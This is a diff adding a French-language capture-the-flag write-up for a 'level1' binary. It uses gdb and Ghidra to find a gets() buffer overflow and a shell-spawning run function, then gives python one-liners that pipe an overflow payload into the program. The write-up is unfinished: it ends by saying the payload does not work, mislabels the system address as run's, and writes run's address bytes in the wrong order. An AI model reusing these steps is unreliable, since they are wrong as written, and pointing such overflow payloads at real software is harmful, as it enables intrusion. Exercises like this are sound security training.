@@ -1,0 +1,36 @@
+### Level1
+
+On rentre sur gdb dans le binaire de level1.
+
+	gdb ./level1
+	(gdb) disas main
+	...
+	0x08048490 <+16>:	call   0x8048340 <gets@plt>
+	...
+
+Cette ligne nous interesse. Gets ne securise pas son buffer. Il est alors possible d'effectuer un bufferoverflow.
+
+Si on recupere le code C a partir de Ghidra, on s'apercoit qu'il y a une fonction run qui permet de lancer un shell.
+On voit aussi que le buffer que recoit gets() est de 76.
+Nous allons recuperer l'adresse de run ainsi que l'adresse de system pour construire notre shellcode.
+
+	gdb ./level1
+	(gdb) p run
+	$3 = {<text variable, no debug info>} 0x8048444 <run>
+
+L'adresse de run est donc : 0x8048444
+
+	(gdb) p system
+	$4 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+L'adresse de run est donc : 0xb7e6b060
+
+Pour lancer notre bufferoverflow nous utiliserons cette commande :
+
+	python -c 'print "0" * 78' | ./level1
+
+En rajoutant le shell code pour appeler l'adresse de run dans l'overflow pour qu'il soit executee :
+
+	python -c 'print "0" * 78 + "\x60\xb0\xe6\xb7" + "0000" + "\x80\x48\x44\x04"' | ./level1
+
+==> Ca marche pas
